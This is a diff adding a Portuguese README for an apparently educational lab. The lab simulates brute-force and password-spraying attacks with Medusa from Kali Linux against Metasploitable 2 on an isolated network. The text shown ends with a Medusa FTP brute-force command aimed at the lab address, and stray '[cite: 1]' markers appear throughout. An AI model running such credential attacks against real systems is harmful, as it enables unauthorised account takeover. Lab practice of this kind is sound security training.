@@ -1,0 +1,27 @@
+# Lab Prático: Simulação de Ataques de Força Bruta e Password Spraying com Medusa
+
+Este repositório contém a documentação e os scripts de um projeto prático de segurança ofensiva e defensiva. O laboratório foi desenvolvido em ambiente isolado utilizando **Kali Linux**, **Metasploitable 2** e a ferramenta **Medusa** para validar vulnerabilidades de autenticação e propor contramedidas de mitigação.
+
+---
+
+## 🚀 Tecnologias e Ferramentas Utilizadas
+* **Hipervisor:** Oracle VM VirtualBox[cite: 1]
+* **Sistemas Operacionais:** Kali Linux (Atacante) e Metasploitable 2 (Alvo Vulnerável)[cite: 1]
+* **Ferramenta de Ataque:** Medusa[cite: 1]
+* **Serviços Alvo:** FTP (`vsftpd`), Aplicação Web (`DVWA`), e SMB/Samba (`smbnt`)[cite: 1]
+
+---
+
+## ⚙️ Configuração do Ambiente
+1. **Rede:** As máquinas virtuais foram configuradas no VirtualBox utilizando uma rede interna (*Host-Only*) para garantir o isolamento completo da rede externa[cite: 1].
+2. **Alvo:** Metasploitable 2 com o endereço IP simulado de laboratório (`192.168.56.101`).
+3. **Atacante:** Kali Linux com o endereço IP (`192.168.56.102`).
+
+---
+
+## 🛠️ Execução de Ataques Simulados
+
+### 1. Ataque de Força Bruta em FTP
+Direcionado ao serviço de transferência de arquivos (`vsftpd`) para validar credenciais fracas em um único usuário.
+```bash
+medusa -h 192.168.56.101 -u msfadmin -P passwords.txt -M ftp
